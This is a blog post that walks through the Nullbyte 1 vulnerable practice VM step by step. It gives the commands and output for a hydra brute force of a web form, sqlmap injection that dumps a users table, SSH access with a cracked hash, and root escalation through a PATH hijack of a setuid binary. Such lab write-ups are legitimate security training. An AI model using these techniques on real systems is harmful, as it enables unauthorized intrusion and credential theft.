<!DOCTYPE html>
<html lang="en">
<head>
		<title>Unlogic &mdash; Nullbyte 1 solution</title>
		<meta charset="utf-8" />
		<link rel="profile" href="http://gmpg.org/xfn/11" />
		<link rel="stylesheet" type="text/css" href="https://unlogic.co.uk/theme/css/style.css" />
        <link rel="stylesheet" type="text/css" href="https://unlogic.co.uk/theme/css/pygments.css" />
		<link rel='stylesheet' id='oswald-css'  href='http://fonts.googleapis.com/css?family=Oswald&#038;ver=3.3.2' type='text/css' media='all' />
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
        <link href='https://fonts.googleapis.com/css?family=Cousine' rel='stylesheet' type='text/css'>
		<style type="text/css">
			body.custom-background { background-color: #f5f5f5; }
		</style>
		<link rel="alternate" type="application/atom+xml"
			title="Unlogic — Flux Atom"
			href="https://unlogic.co.uk/" /> 
		<link rel ="alternate" type="application/rss+xml"
			title="Unlogic — Flux RSS"
			href="https://unlogic.co.uk/rss.xml" /> 
		<!--[if lte IE 8]><script src="https://unlogic.co.uk/theme/js/html5shiv.js"></script><![endif]-->
</head>

<body class="home blog custom-background single-author" >
	<div id="container">
		<div id="header">
				<h1 id="site-title"><a href="https://unlogic.co.uk/">Unlogic</a></h1>
<h2 id="site-description">I've got a keyboard, a terminal, and a whole load of luck</h2>		</div><!-- /#banner -->
		
		<div id="menu">
            <div class="menu-social-container">
                <ul id="menu-social" class="social">
                    <li><a href="https://keybase.io/unlogic" title="Keybase"><i class="fa fa-key fa-1x"></i></a></li>
                    <li><a href="https://twitter.com/binaryheadache" title="Twitter"><i class="fa fa-twitter fa-1x"></i></a></li>
                    <li><a href="https://github.com/svenito" title="Github"><i class="fa fa-github fa-1x"></i></a></li>
                    <li><a href="https://unlogic.co.uk/feed.xml" title="RSS Feed"><i class="fa fa-rss fa-1x"></i></a></li>
                </ul>
            </div>
			<div class="menu-navigation-container">
                
                <ul id="menu-navigation" class="menu">
						<li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="https://unlogic.co.uk/pages/all-posts.html">All posts</a></li>

				</ul>
			</div> <!--/#menu-navigation-container-->
            <div style="clear: both;"></div>
		</div><!-- /#menu -->
		
		<div class="page-title">
		</div>
	
		<div id="contents">

<div class="post type-post status-publish format-standard hentry category-general" id="post">
	<div class="entry-meta">
		<div class="date"><a href="https://unlogic.co.uk/2015/08/25/nullbyte-1-solution/">Tue 25 August 2015</a></div>
			<div class="comments"><a href="https://unlogic.co.uk/2015/08/25/nullbyte-1-solution/#disqus_thread" title="Comment on Nullbyte 1 solution">comments</a></div>
	</div> <!-- /#entry-meta -->
	<div class="main">
		<h2 class="entry-title">
			<a href="https://unlogic.co.uk/2015/08/25/nullbyte-1-solution/" title="Permalink to Nullbyte 1 solution" rel="bookmark">Nullbyte 1 solution</a>
		</h2>
		<div class="entry-content">
			<p>I've been AFK for a while because of various reasons, but now I'm back and have
managed to scrape a little time together to get on with some of <a class="reference external" href="https://vulnhub.com">Vulnhub's</a>
new VMs.</p>
<p>So let's start with <a class="reference external" href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte 1</a></p>
<div class="section" id="stage-1">
<h2>Stage 1</h2>
<p>I ran the usual service discovery and found:</p>
<pre class="code bash literal-block">
root&#64;kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-08-25 11:29 BST
Nmap scan report <span class="k">for</span> 192.168.56.101
Host is up <span class="o">(</span>0.00057s latency<span class="o">)</span>.
Not shown: <span class="m">997</span> closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
111/tcp open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c1">#100000)
</span>777/tcp open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre>
<p>HTTP server on 80 and ssh on 777. I'm going to take the straightforward one, and head
to the HTTP server first.</p>
<p>Upon opening the page I only get an image and some text</p>
<img alt="" src="http://i.imgur.com/SlVGKol.png" />
<p>I ran <code>dirbuster</code> on the root and got a couple of hits: <code>uploads</code> and <code>phpmyadmin</code>. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.</p>
<p>The source of the page doesn't reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn't appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.</p>
<pre class="code bash literal-block">
root&#64;kali:~/Downloads# exiftool main.gif
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : <span class="m">16</span> kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-<span class="o">)</span>: kzMb5nVYJw
Image Size                      : 235x302
</pre>
<p>Hrmm, that comment looks unusual. Let's try that in the URL. Initially I got a 404
but that's because I didn't remove the <code>P-): `. Hitting :code:`http://192.168.56.101/kzMb5nVYJw</code>
takes me to a form asking for a key.</p>
</div>
<div class="section" id="stage-2">
<h2>Stage 2</h2>
<p>Typing in something random just shows <code>invalid key</code>. Ok, let me take a look at the source,
see where this thing goes.</p>
<pre class="code html literal-block">
<span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;index.php&quot;</span><span class="p">&gt;</span>
Key:<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;key&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
<span class="c">&lt;!-- this form isn't connected to mysql, password ain't that complex --!&gt;</span>
</pre>
<p>Ok, so no SQLi here then, and the password isn't complex either. I'm guessing
a simple wordlist might solve this for me. Time to break out <code>hydra</code> for this:</p>
<pre class="code bash literal-block">
root&#64;kali:~# hydra 192.168.56.101 http-form-post <span class="s2">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l x -P /usr/share/dict/words -t <span class="m">10</span> -w 30
Hydra v8.1 <span class="o">(</span>c<span class="o">)</span> <span class="m">2014</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.

Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2015-08-25 11:41:58
<span class="o">[</span>DATA<span class="o">]</span> max <span class="m">10</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">99171</span> login tries <span class="o">(</span>l:1/p:99171<span class="o">)</span>, ~154 tries per task
<span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
<span class="o">[</span>STATUS<span class="o">]</span> 18687.00 tries/min, <span class="m">18687</span> tries in 00:01h, <span class="m">80484</span> todo in 00:05h, <span class="m">10</span> active
<span class="o">[</span>80<span class="o">][</span>http-post-form<span class="o">]</span> host: 192.168.56.101   login: x   password: elite
<span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</pre>
<p>Bingo. Once I enter that into the field I am able to search for usernames.</p>
</div>
<div class="section" id="stage-3">
<h2>Stage 3</h2>
<p>Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don't do much, entering nothing dumps multiple records. Maybe I will
try to <code>sqlmap</code> the URL to see if there's any vulnerabilities there</p>
<pre class="code bash literal-block">
root&#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>

&lt;snip&gt;

<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">'usrtosearch'</span> seems to be <span class="s1">'MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)'</span> injectable
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">'Generic UNION query (NULL) - 1 to 20 columns'</span>
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">'MySQL UNION query (NULL) - 1 to 20 columns'</span>
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> automatically extending ranges <span class="k">for</span> UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> ORDER BY technique seems to be usable. This should reduce the <span class="nb">time</span> needed to find the right number of query columns. Automatically extending the range <span class="k">for</span> current UNION query injection technique <span class="nb">test</span>
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL appears to have <span class="m">3</span> columns in query
<span class="o">[</span>11:13:26<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> GET parameter <span class="s1">'usrtosearch'</span> is <span class="s1">'MySQL UNION query (NULL) - 1 to 20 columns'</span> injectable
</pre>
<p>Result! Using this we can now dump the databasenames, tables, and data in the DB</p>
<p>(output shortened for clarity)</p>
<pre class="code bash literal-block">
root&#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>ramses --current-db
back-end DBMS: MySQL 5.0.12
<span class="o">[</span>11:13:44<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching current database
current database:    <span class="s1">'seth'</span>

root&#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>ramses --tables -D seth
<span class="o">[</span>11:13:55<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="s1">'seth'</span>
Database: seth
<span class="o">[</span><span class="m">1</span> table<span class="o">]</span>
+-------+
<span class="p">|</span> users <span class="p">|</span>
+-------+


root&#64;kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span class="o">=</span>ramses --dump -D seth -T users
Database: seth
Table: users
<span class="o">[</span><span class="m">2</span> entries<span class="o">]</span>
+----+---------------------------------------------+--------+------------+
<span class="p">|</span> id <span class="p">|</span> pass                                        <span class="p">|</span> user   <span class="p">|</span> position   <span class="p">|</span>
+----+---------------------------------------------+--------+------------+
<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE <span class="p">|</span> ramses <span class="p">|</span> &lt;blank&gt;    <span class="p">|</span>
<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> --not allowed--                             <span class="p">|</span> isis   <span class="p">|</span> employee   <span class="p">|</span>
+----+---------------------------------------------+--------+------------+
</pre>
<p>An MD5 hashed password? I best put that through <a class="reference external" href="http://md5decoder.org/">md5decoder</a> to
be rewarded with the password <code>omega</code></p>
</div>
<div class="section" id="stage-4">
<h2>stage 4</h2>
<p>Turns out that this is ramses's password on the ssh service that's running on
port 777 on the VM. So I'll connect to that and have a look at what's going on there.</p>
<p>Not much in his home directory, so I'll checkout what he's been up to</p>
<pre class="code bash literal-block">
ramses&#64;NullByte:~$ cat .bash_history
sudo -s
su eric
<span class="nb">exit</span>
ls
clear
<span class="nb">cd</span> /var/www
<span class="nb">cd</span> backup/
ls
./procwatch
clear
sudo -s
<span class="nb">cd</span> /
ls
<span class="nb">exit</span>
</pre>
<p>Interesting, ramses has something in <code>/var/www</code>. Seems like a setuid root
binary called <code>procwatch</code>. After running it I would assume that it's just running <code>ps</code>
to return a list of processes. If I run <code>ps</code> on its own, I get the same output (minus
procwatch of course)</p>
<p>So let's see if it calls <code>ps</code> with an absolute path, or not. As a quick test I'll create
a symlink to <code>ls</code> in the current directory and name it <code>ps</code>. Then I set the <code>PATH</code> environment variable
with the current dir at the front.</p>
<pre class="code bash literal-block">
ramses&#64;NullByte:/var/www/backup$ ln -s /bin/ls ps
ramses&#64;NullByte:/var/www/backup$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>:<span class="si">${</span><span class="nv">PATH</span><span class="si">}</span>
ramses&#64;NullByte:/var/www/backup$ ./procwatch
ls  procwatch  ps  readme.txt
</pre>
<p>Excellent, it just calls <code>ps</code> without a path. A classic issue you can often
find in programs that call other programs.</p>
<p>So let me leverage this to get myself a root shell and ultimately the flag</p>
<pre class="code bash literal-block">
ramses&#64;NullByte:/var/www/backup$ ln -snf /bin/sh ps
ramses&#64;NullByte:/var/www/backup$ ./procwatch
<span class="c1"># whoami
</span>root
<span class="c1"># cat /root/proof.txt
</span><span class="o">[</span>OUTPUT CUT<span class="o">]</span>
</pre>
<p>And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.</p>
</div>

		</div> <!--/#entry-content-->
	</div> <!--/#main-->
</div>  <!--/#post-->
	<div id="comments">
		<div id="respond">
			<div id="disqus_thread"></div>
	        <script type="text/javascript">
	            var disqus_shortname = 'unlogic';
	
	            /* * * DON'T EDIT BELOW THIS LINE * * */
	            (function() {
	                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
	                dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
	                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	            })();
	        </script>
	        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
	        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
		</div><!-- #respond -->					
</div><!-- #comments -->

		</div>
		
		<div id="footer">
			<p><p>Powered by <a href="http://getpelican.com">Pelican</a></p>
<script type="text/javascript">
    var disqus_shortname = 'unlogic';
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = 'http://' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>		</div><!-- /#footer -->
	</div><!-- /#container -->
	<div style="display:none"></div>
</body>
</html>